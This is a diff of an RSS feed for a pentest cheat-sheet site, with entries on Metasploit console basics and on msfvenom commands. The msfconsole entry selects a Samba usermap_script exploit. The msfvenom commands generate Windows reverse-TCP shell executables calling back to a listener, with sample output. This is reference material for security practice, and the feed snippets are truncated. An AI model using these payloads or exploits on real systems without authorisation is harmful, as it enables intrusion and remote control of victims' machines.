@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/metasploit/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/metasploit/</guid>
-      <description>msfconsole meterpreter Start msfconsole msfconsole -q Basic Commands # Return to previous page back # Upgrade session sessions -u # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts &amp;lt;TARGET&amp;gt; set lhost &amp;lt;LOCAL_IP&amp;gt; set lport &amp;lt;LOCAL_PORT&amp;gt; # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
+      <description>msfconsole meterpreter Start Msfconsole msfconsole -q General # Return to previous page back # Upgrade session sessions -u # Quit exit Search Exploit search &amp;lt;KEYWORD&amp;gt; search samba use &amp;lt;NUM&amp;gt; use 15 # Choose by full path use &amp;lt;MODULE_PATH&amp;gt; use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts &amp;lt;TARGET&amp;gt; set lhost &amp;lt;LOCAL_IP&amp;gt; set lport &amp;lt;LOCAL_PORT&amp;gt; # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
     </item>
     <item>
       <title>Metasploit Listener</title>
@@ -26,7 +26,7 @@
       <link>https://tldrbins.github.io/metasploit_shellcode/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/metasploit_shellcode/</guid>
-      <description>Generate Shellcode Note: stageless payload can catch with nc directly&#xA;Windows x64 Staged exe Stageless exe Staged dll msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.exe $ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.31 LPORT=1337 &amp;gt; rev.exe No encoder specified, outputting raw payload Payload size: 510 bytes Final size of exe file: 7168 bytes msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.</description>
+      <description>Generate Shellcode Note: stageless payload can catch with nc directly&#xA;Windows x64 Staged exe Stageless exe Staged dll Stageless dll msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.exe $ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.31 LPORT=1337 &amp;gt; rev.exe No encoder specified, outputting raw payload Payload size: 510 bytes Final size of exe file: 7168 bytes msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.</description>
     </item>
   </channel>
 </rss>
